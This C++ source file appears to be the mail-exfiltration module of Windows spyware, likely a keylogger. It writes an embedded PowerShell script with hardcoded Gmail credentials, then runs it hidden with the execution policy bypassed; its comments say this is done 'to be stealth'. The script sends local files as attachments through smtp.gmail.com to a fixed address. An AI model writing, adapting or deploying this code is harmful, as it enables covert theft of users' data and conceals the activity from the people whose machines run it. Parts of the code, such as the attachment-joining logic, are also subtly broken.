#include "../headers/SendMail.hpp"

#define X_EM_TO "emailtosend@mail.com"
#define X_EM_FROM "emailfromsend@mail.com"
#define X_EM_PASS "mailpassword"

Timer mail_timer; //global variable, to not "die" after the function ends, so if the mail-send fails, we can repeat the function
DWORD * exit_code = (DWORD *) malloc(sizeof(DWORD)); //global variable to set the exit_code of the process
static int wait = 0;
const std::string &PowerShellScript =
"Param(#parameters \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
"[String]$Body\r\n)\r\n\r\nFunction send_mail"
" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
"                        $Attachments = $attachment -split (\"\\:\\:\")\r\n                      "
"  ForEach ($val in $Attachments)\r\n                    "
"        {\r\n               "
"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
"}\r\n                catch\r\n                    {\r\n                        exit 2 #attachment not found or dont have permission"
"\r\n                    }\r\n            }\r\n "
"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password) \r\n            $Client.Send($Msg)\r\n "
"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
"exit 7#everything went ok \r\n          }\r\n      catch\r\n          {\r\n            exit 3 "
"  \r\n          }\r\n} #End Function send_mail\r\ntry\r\n    {\r\n        "
"send_mail -attachment $Att "
"-To \"" +
 std::string (X_EM_TO) +
 "\""
" -Body $Body -Subject $Subj "
"-password \"" +
 std::string (X_EM_PASS) +
  "\""
" -From \"" +
 std::string (X_EM_FROM) +
"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef X_EM_TO
#undef X_EM_FROM
#undef X_EM_PASS


std::string Mail::replace_string(std::string s, const std::string &what, const std::string &with){
    if(what.empty()) return s;
    size_t sp = 0;

    while((sp = s.find(what, sp)) != std::string::npos)
        s.replace(sp, what.length(), with), sp += with.length();
    return s;
}

bool Mail::check_file(const std::string &f){
    std::ifstream file;
    file.open(f);
    if(file) {
        file.close();
        return true;
    }
    return false;
}


bool Mail::create_script(){
    std::ofstream script(IO::get_path(true) +  std::string(script_name));
    if(!script) return false;
    script << PowerShellScript;
    if(!script) return false;

    script.close();
    return true;
}


int Mail::send_mail(const std::string &subject, const std::string &body, const std::string &attachments){
    bool check_succ; // used for testing within this code

    check_succ = IO::make_dir(IO::get_path(true));
    if(!check_succ) return -1; //couldnt create the dir

    std::string src_path = IO::get_path(true) + std::string(script_name);

    if(!check_file(src_path))
        check_succ = create_script();

    if(!check_succ) return -2;  //couldnt create the script

    std::string param = "-ExecutionPolicy ByPass -File \"" + src_path + "\" -Subj \""
                            + replace_string(subject, "\"", "\\\"") + "\" -Body \""
                            + replace_string(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";
    SHELLEXECUTEINFO shell_exec_info = {0};
    shell_exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
    shell_exec_info.fMask = SEE_MASK_NOCLOSEPROCESS;  // prevent process from closing so we can see how it performs etc
    shell_exec_info.hwnd = NULL; // we should not have a window when running, in order to be stealth
    shell_exec_info.lpVerb = "open";  // essentially, the right-click + open we do to files
    shell_exec_info.lpFile = "powershell";
    shell_exec_info.lpParameters = param.c_str();
    shell_exec_info.lpDirectory = NULL;  // represents a working directory, which we don't really need in this case
    shell_exec_info.nShow = SW_HIDE;  // so it remains hidden (does not "pop" up)
    shell_exec_info.hInstApp = NULL; // basically "handles" the instance
    check_succ = (bool) ShellExecuteEx(&shell_exec_info);

    if(!check_succ) return -3; //couldnt execute the script

    WaitForSingleObject(shell_exec_info.hProcess, 7000); // wait for 7 sec
    if (wait ==0) GetExitCodeProcess(shell_exec_info.hProcess, exit_code);  // check how its the powershell and if it fails it will have another chance
    mail_timer.set_function([&](){              //lambda function
        WaitForSingleObject(shell_exec_info.hProcess, 60000); // wait 1 min
        GetExitCodeProcess(shell_exec_info.hProcess, exit_code);  // get exit code
        if((int) *exit_code == STILL_ACTIVE){ // 259 if it's still active
            TerminateProcess(shell_exec_info.hProcess, 7);
            *exit_code =7;
        }
        Helper::WriteAppLog("<From send_mail> return code: " + Helper::ToString((int) *exit_code));
    });
    mail_timer.set_repeat_count(1L); // so, execute only once
    mail_timer.set_interval(10L);
    mail_timer.start_timer(true);
    if(wait ==0) {
        wait++;
        return 15;
    }else return (int) *exit_code;
}

//overload the SendMail() function to accept params
int Mail::send_mail(const std::string &subj, const std::string &body, const std::vector<std::string> &attachments){
    std::string return_attachments;
    if(attachments.size() == 1U) // so if we have only one attachment
        return_attachments = attachments.at(0);

        for(const auto &element: attachments)
            return_attachments += element + "::";
        return_attachments = return_attachments.substr(0, return_attachments.length() - 2);

    return send_mail(subj, body, return_attachments);
}

